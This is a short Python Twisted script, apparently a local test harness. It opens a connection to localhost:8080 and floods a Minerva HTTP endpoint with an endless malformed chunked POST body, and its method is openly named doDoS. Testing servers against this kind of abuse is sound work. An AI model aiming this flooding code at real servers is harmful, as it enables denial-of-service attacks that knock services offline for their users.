import sys
from twisted.python import log
log.startLogging(sys.stdout)

from twisted.internet import reactor
from twisted.internet.protocol import Factory, Protocol
from twisted.internet.endpoints import TCP4ClientEndpoint

class Greeter(Protocol):
	def dataReceived(self, data):
		print "Got:", repr(data)

	def doDoS(self):
		self.transport.setTcpNoDelay(True)
		self.transport.write("POST /_minerva/io/ HTTP/1.1\r\nTransfer-Encoding: chunked\r\n\r\n")
		reactor.callLater(0.001, self.sendMore)

	def sendMore(self):
		print "."
		reactor.callLater(0.001, self.sendMore)
		self.transport.write("7" * 4096)

class GreeterFactory(Factory):
	def buildProtocol(self, addr):
		return Greeter()

def gotProtocol(p):
	p.doDoS()

point = TCP4ClientEndpoint(reactor, "localhost", 8080)
d = point.connect(GreeterFactory())
d.addCallback(gotProtocol)
reactor.run()
